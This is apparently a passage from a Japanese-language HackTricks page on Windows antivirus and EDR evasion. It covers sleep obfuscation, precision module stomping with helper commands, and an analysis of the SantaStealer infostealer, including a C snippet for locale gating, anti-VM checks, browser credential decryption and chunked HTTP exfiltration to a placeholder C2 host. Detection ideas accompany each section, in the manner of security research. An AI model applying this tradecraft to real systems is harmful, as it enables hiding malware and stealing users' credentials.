- Typical chain (x64): image を `PAGE_READWRITE` に設定 → `advapi32!SystemFunction032` で full mapped image を RC4 encrypt → blocking wait を実行 → RC4 decrypt → PE sections を walk して **restore per-section permissions** → completion を signal する。
- `RtlCaptureContext` は template `CONTEXT` を提供する。これを複数の frames に clone し、各 step を呼び出すよう registers（`Rip/Rcx/Rdx/R8/R9`）を設定する。

Operational detail: 長い wait では “success”（例: `WAIT_OBJECT_0`）を返し、caller が image が masked のまま続行するようにする。この pattern は idle windows 中に module を scanners から隠し、典型的な “patched `Sleep()`” signature を回避する。

Detection ideas (telemetry-based)
- `NtContinue` を指す `CreateTimerQueueTimer` callbacks の burst。
- 大きな contiguous な image-sized buffers に対する `advapi32!SystemFunction032` の使用。
- 大範囲の `VirtualProtect` の後に custom per-section permission restoration が続く。

## Precision Module Stomping

Module stomping は、明白な private executable memory を割り当てたり、新しい sacrificial DLL を load したりせず、target process 内にすでに mapped されている DLL の **`.text` section** から payload を実行する。overwrite の target は、process がまだ必要とする code paths を壊さずに payload を収められる **loaded, disk-backed image** であるべきだ。

### Reliable target selection

`uxtheme.dll` や `comctl32.dll` のような一般的な module に対する naive な stomping は fragile だ。DLL が remote process に load されていない可能性があり、code region が小さすぎると process が crash する。より reliable な workflow は次のとおり:

1. target process modules を列挙し、すでに loaded されている DLL の **names-only include list** を保持する。
2. payload を先に build し、その **exact byte size** を記録する。
3. candidate DLL を disk 上で scan し、PE section の **`.text` `Misc_VirtualSize`** を payload size と比較する。これは file size より重要で、**memory に mapped されたとき** の executable section size を反映するため。
4. **Export Address Table (EAT)** を解析し、stomp start offset として exported function の RVA を選ぶ。
5. **blast radius** を計算する: payload が selected function boundary を超えると、memory 上でその後ろに並ぶ adjacent exports を overwrite する。

wild で見られる typical recon/selection helpers:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
運用上の注意
- 遠隔プロセス内で**すでに読み込まれている**DLLを優先し、`LoadLibrary`のテレメトリや予期しないイメージ読み込みを避ける。
- 対象アプリケーションでめったに実行されない export を優先する。そうしないと、通常のコードパスが thread creation の前後に stomp されたバイトへ到達してしまう可能性がある。
- 大きな implant では、shellcode の埋め込みを文字列リテラルから**byte-array/braced initializer**へ変更する必要がよくある。そうすることで、injector のソース内で全バッファが正しく表現される。

検知のアイデア
- よくある private RWX/RX allocations ではなく、**image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) への遠隔書き込み。
- メモリ上のバイト列がディスク上の元ファイルと一致しなくなった export entry point。
- 正規のDLL export 内で実行を開始する remote threads や context pivots だが、その先頭バイトが最近変更されている。
- DLL の `.text` ページに対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` の連続後に thread creation が行われる。

## SantaStealer の Fileless Evasion と Credential Theft の Tradecraft

SantaStealer (aka BluelineStealer) は、現代の info-stealer が AV bypass、anti-analysis、credential access を単一のワークフローに組み合わせる様子を示している。

### Keyboard layout gating & sandbox delay

- config フラグ (`anti_cis`) は `GetKeyboardLayoutList` を使ってインストール済みの keyboard layout を列挙する。Cyrillic layout が見つかると、サンプルは空の `CIS` マーカーを生成し、stealers を実行する前に終了する。これにより、除外対象のロケールでは決して detonat しない一方で、hunting artifact は残す。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` ロジック

- Variant A は process list を走査し、各 name をカスタム rolling checksum で hash して、debuggers/sandboxes 向けの埋め込み blocklists と比較する。さらに computer name に対しても checksum を繰り返し、`C:\analysis` のような working directories も確認する。
- Variant B は system properties（process-count の下限、recent uptime）を調べ、VirtualBox additions を検出するために `OpenServiceA("VBoxGuest")` を呼び出し、single-stepping を見つけるために sleep 前後の timing checks を実行する。どれかに一致すると modules を launch する前に abort する。

### Fileless helper + double ChaCha20 reflective loading

- primary DLL/EXE は Chromium credential helper を埋め込んでおり、それは disk に drop されるか、または memory 上で manual map される。fileless mode では imports/relocations を自力で解決するため、helper artifacts は書き込まれない。
- その helper は ChaCha20（2つの 32-byte keys + 12-byte nonces）で 2回暗号化された second-stage DLL を保存している。両方の pass の後、blob を reflectively load し（`LoadLibrary` なし）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) から派生した `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export を呼び出す。
- ChromElevator routines は direct-syscall reflective process hollowing を使って live Chromium browser に inject し、AppBound Encryption keys を継承し、ABE hardening にもかかわらず SQLite databases から passwords/cookies/credit cards を直接 decrypt する。


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` は global な `memory_generators` function-pointer table を反復し、enabled な module（Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.）ごとに 1 thread を spawn する。各 thread は結果を shared buffers に書き込み、約 45s の join window 後に file count を報告する。
- 完了すると、すべてが statically linked な `miniz` library で `%TEMP%\\Log.zip` として zip される。続いて `ThreadPayload1` は 15s sleep し、`http://<C2>:6767/upload` へ HTTP POST で archive を 10 MB chunks に分けて stream する。browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を spoof し、各 chunk に `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` を追加する。最後の chunk は `complete: true` を付け加え、C2 が reassembly 完了を把握できるようにする。

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
